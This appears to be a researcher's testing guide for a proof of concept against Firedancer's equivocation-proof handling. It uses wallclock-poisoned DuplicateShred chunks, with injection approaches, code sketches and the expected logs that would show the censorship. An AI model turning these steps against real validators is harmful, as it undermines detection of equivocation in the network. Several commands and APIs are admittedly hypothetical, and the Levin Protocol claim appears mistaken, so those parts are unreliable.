# Manual Testing Guide for CONSENSUS-002 PoC

## Overview

This PoC demonstrates the equivocation proof censorship vulnerability by generating malformed DuplicateShred chunks with manipulated wallclock timestamps. Due to the complexity of Solana's gossip protocol, **actual injection into a running fddev node requires additional implementation**.

This document provides guidance for completing the PoC demonstration.

## Challenge: Gossip Protocol Complexity

The DuplicateShred chunks must be wrapped in Solana's gossip protocol structures before being accepted by fddev:

1. **CrdsValue Wrapping**: Chunks must be wrapped in `CrdsValue::DuplicateShred(index, chunk)`
2. **CrdsData Envelope**: Requires signature, wallclock, and label
3. **Gossip Message Framing**: Push/Pull gossip messages have specific formats
4. **Levin Protocol** (for Firedancer): Binary protocol with headers

## Approach 1: Direct Injection via fddev Test Interface (Recommended)

If fddev provides a test interface for injecting gossip messages, this is the cleanest approach:

### Steps:

1. **Build the PoC**:
   ```bash
   cd SR/Findings/PoC/CONSENSUS-002
   cargo build --release
   ```

2. **Generate chunks**:
   ```bash
   ./target/release/consensus-002-poc
   ```
   This creates `./output/*.bin` files containing serialized DuplicateShred structures.

3. **Inject via fddev test interface** (hypothetical - check fddev documentation):
   ```bash
   # Example (syntax depends on fddev's actual API):
   fdctl gossip inject-crds-value --type duplicate-shred --file output/slot100_chunk0.bin
   fdctl gossip inject-crds-value --type duplicate-shred --file output/slot100_chunk1.bin
   # ... etc
   ```

4. **Monitor logs**:
   ```bash
   grep -E "(chunk|duplicate|eqvoc)" fddev.log
   ```

5. **Analyze results**:
   ```bash
   cargo run --release -- --analyze-logs fddev.log
   ```

## Approach 2: Solana Gossip Client (Agave-Compatible)

Create a minimal gossip client that speaks Solana's protocol:

### Implementation Sketch (Rust):

```rust
use solana_gossip::crds_value::{CrdsValue, CrdsData};
use solana_gossip::contact_info::ContactInfo;
use solana_sdk::signature::{Keypair, Signer};

fn inject_duplicate_shred_chunk(
    gossip_endpoint: SocketAddr,
    chunk: DuplicateShred,
    keypair: &Keypair,
) -> Result<()> {
    // Wrap in CrdsValue
    let crds_data = CrdsData::DuplicateShred(0, chunk);
    let crds_value = CrdsValue::new_signed(crds_data, keypair);

    // Create push message
    let push_message = Protocol::PushMessage(
        keypair.pubkey(),
        vec![crds_value],
    );

    // Send to gossip endpoint
    // ... (requires full gossip protocol implementation)
}
```

This requires adding Solana crates as dependencies and implementing the gossip handshake.

## Approach 3: Python with Solana Libraries

Use Solana's Python SDK to construct and send gossip messages:

```python
# Hypothetical - actual implementation requires Solana gossip library
import solana_gossip

# Load generated chunks
chunks = load_chunks("./output")

# Create gossip client
client = solana_gossip.GossipClient("127.0.0.1:8001")
client.connect()

# Send chunks
for chunk_file in chunks:
    chunk = deserialize_chunk(chunk_file)
    client.push_duplicate_shred(chunk)
    time.sleep(0.5)
```

## Approach 4: fddev Code Modification (Last Resort)

If no test interface exists, temporarily modify fddev to accept raw chunks:

### Location: `src/choreo/eqvoc/fd_eqvoc.c`

Add a test function:

```c
#ifdef FD_EQVOC_TEST_MODE
void
fd_eqvoc_test_inject_chunk( fd_eqvoc_t * eqvoc,
                            uchar const * chunk_data,
                            ulong chunk_sz ) {
  fd_gossip_duplicate_shred_t chunk;
  // Deserialize chunk_data into chunk
  fd_bincode_decode_ctx_t ctx = { .data = chunk_data, .dataend = chunk_data + chunk_sz };
  fd_gossip_duplicate_shred_decode( &chunk, &ctx );

  // Get or create proof entry
  fd_eqvoc_proof_t * proof = fd_eqvoc_proof_query( eqvoc, chunk.slot, &chunk.from );
  if( !proof ) {
    proof = fd_eqvoc_proof_insert( eqvoc, chunk.slot, &chunk.from );
    fd_eqvoc_proof_init( proof, &chunk.from, chunk.wallclock, chunk.num_chunks, 1054, eqvoc->bmtree_mem );
  }

  // Insert chunk (this will trigger the vulnerable logic)
  fd_eqvoc_proof_chunk_insert( proof, &chunk );
}
#endif
```

Then compile with `-DFD_EQVOC_TEST_MODE` and call via RPC or CLI.

## Expected Log Behavior

### Slot 100 (Normal - Should See Assembly + Failure)

```
[INFO] fd_eqvoc: received chunk (slot=100, from=Fake..., idx=0/3, wallclock=1700000000000)
[INFO] fd_eqvoc: received chunk (slot=100, from=Fake..., idx=1/3, wallclock=1700000000000)
[INFO] fd_eqvoc: received chunk (slot=100, from=Fake..., idx=2/3, wallclock=1700000000000)
[INFO] fd_eqvoc: proof complete for slot 100, verifying...
[ERROR] fd_eqvoc: proof verification failed for slot 100: invalid signature
```

### Slot 200 (Poisoned - Should See Rejection, NO Assembly)

```
[INFO] fd_eqvoc: received chunk (slot=200, from=Fake..., idx=0/3, wallclock=999999999999999)
[WARNING] received newer chunk (slot: 200). overwriting.
[INFO] fd_eqvoc: received chunk (slot=200, from=Fake..., idx=0/3, wallclock=1700000000000)
[WARNING] received older chunk. ignoring.
[INFO] fd_eqvoc: received chunk (slot=200, from=Fake..., idx=1/3, wallclock=1700000000000)
[WARNING] received older chunk. ignoring.
[INFO] fd_eqvoc: received chunk (slot=200, from=Fake..., idx=2/3, wallclock=1700000000000)
[WARNING] received older chunk. ignoring.
```

**CRITICAL**: Note the **absence** of:
- "proof complete for slot 200"
- "verifying..." for slot 200
- Any verification error for slot 200

This proves the attack - the proof never assembled because legitimate chunks were rejected.

### Slot 300 (Normal - Should See Assembly + Failure)

```
[INFO] fd_eqvoc: received chunk (slot=300, from=Fake..., idx=0/3, wallclock=1700000000000)
[INFO] fd_eqvoc: received chunk (slot=300, from=Fake..., idx=1/3, wallclock=1700000000000)
[INFO] fd_eqvoc: received chunk (slot=300, from=Fake..., idx=2/3, wallclock=1700000000000)
[INFO] fd_eqvoc: proof complete for slot 300, verifying...
[ERROR] fd_eqvoc: proof verification failed for slot 300: invalid signature
```

## Verifying the Vulnerability

The key evidence is the **differential behavior** across the three slots:

| Slot | Chunks Received | Assembly Complete | Verification Attempted | Result |
|------|----------------|-------------------|----------------------|--------|
| 100  | ✅ (3/3)        | ✅ Yes             | ✅ Yes (failed)       | Normal |
| 200  | ⚠️ (rejected)   | ❌ NO              | ❌ NO                 | **BLOCKED** |
| 300  | ✅ (3/3)        | ✅ Yes             | ✅ Yes (failed)       | Normal |

**Slot 200's missing validation logs prove the vulnerability**: The wallclock poisoning permanently blocked chunk assembly, preventing equivocation detection.

## Troubleshooting

### Issue: No logs appear for any slot

**Possible causes**:
- fddev not running with verbose logging
- Chunks not actually reaching gossip layer
- Serialization format mismatch

**Solutions**:
```bash
# Ensure verbose logging
fddev --log-level 3 dev

# Check if gossip port is listening
netstat -an | grep 8001

# Verify chunk files are generated
ls -lh ./output/
```

### Issue: All slots show validation (including slot 200)

**Possible causes**:
- Chunks arriving out of sequence
- fddev may have mitigations already implemented
- Serialization incompatibility

**Solutions**:
- Verify poison chunk is sent **first** for slot 200
- Check fddev version (vulnerability may be patched)
- Examine actual log timestamps to confirm ordering

### Issue: Cannot inject via gossip protocol

**Solution**: Use fddev's internal test interfaces or modify code temporarily (see Approach 4).

## Alternative Demonstration

If direct injection proves difficult, you can demonstrate the vulnerability by:

1. **Code Review**: Show the vulnerable code path in `fd_eqvoc.c:190-197`
2. **Unit Test**: Add a unit test in fddev's test suite that directly calls `fd_eqvoc_proof_chunk_insert` with crafted chunks
3. **Trace Analysis**: Use `strace` or `gdb` to observe chunk handling behavior

## Conclusion

This PoC generates the necessary malicious payloads to demonstrate CONSENSUS-002. The primary challenge is the final step: injecting chunks into fddev's gossip layer using proper protocol formatting.

The vulnerability exists regardless of injection difficulty - the flawed logic is clearly visible in the code, and the PoC payloads demonstrate the attack payload construction.

For a complete end-to-end demonstration, consider implementing Approach 2 (Solana gossip client) or working with the Firedancer team to provide a test injection mechanism.
